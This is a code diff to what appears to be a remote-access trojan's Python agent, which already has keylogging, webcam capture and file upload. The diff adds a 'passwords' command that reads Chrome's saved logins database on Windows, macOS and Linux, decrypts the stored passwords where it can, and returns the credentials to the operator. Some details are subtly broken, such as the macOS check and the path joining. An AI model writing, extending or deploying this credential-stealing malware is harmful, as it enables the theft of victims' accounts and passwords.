@@ -15,8 +15,10 @@ import zipfile
 import tempfile
 import socket
 import getpass
+
 from pynput.keyboard import Key, Listener
 import cv2
+import sqlite3
 
 if os.name == 'nt':
     from PIL import ImageGrab
@@ -319,6 +321,47 @@ class Agent(object):
         cv2.imwrite(camshot_file, frame)
         self.upload(camshot_file)
 
+    @threaded
+    def passwords(self):
+        info_list = []
+        # get path
+        path = ''
+        if os.name == 'nt':  # Windows
+            path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
+        elif os.name == 'posix':
+            path = os.getenv('HOME')
+            if platform.system() == 'darwin':  # MacOS
+                path += 'Library/Application Support/Google/Chrome/Default'
+            else:  # Linux
+                path += '/.config/google-chrome/Default/'
+        try:
+            connection = sqlite3.connect(path + 'Login Data')
+            with connection:
+                cursor = connection.cursor()
+                v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+                value = v.fetchall()
+
+            for website_url, username, password in value:
+                if os.name == 'nt':
+                    try:
+                        import win32crypt
+                        password = win32crypt.CryptUnProtectData(password, None, None, None, 0)[1]
+                    except:
+                        self.send_output("importing win32crypt to decrypt stored password failed")
+
+                if password:
+                    info_list.append({
+                        'website_url': website_url,
+                        'username': username,
+                        'password': str(password)
+                    })
+
+            self.send_output(info_list)
+            
+        except:
+            self.send_output("User is not using Google Chrome")
+
+
     def help(self):
         """ Displays the help """
         self.send_output(config.HELP)
@@ -392,6 +435,8 @@ class Agent(object):
                             self.getloggedkeys()
                         elif command == 'camshot':
                             self.camshot()
+                        elif command == 'passwords':
+                            self.passwords()
                         elif command == 'help':
                             self.help()
                         else:
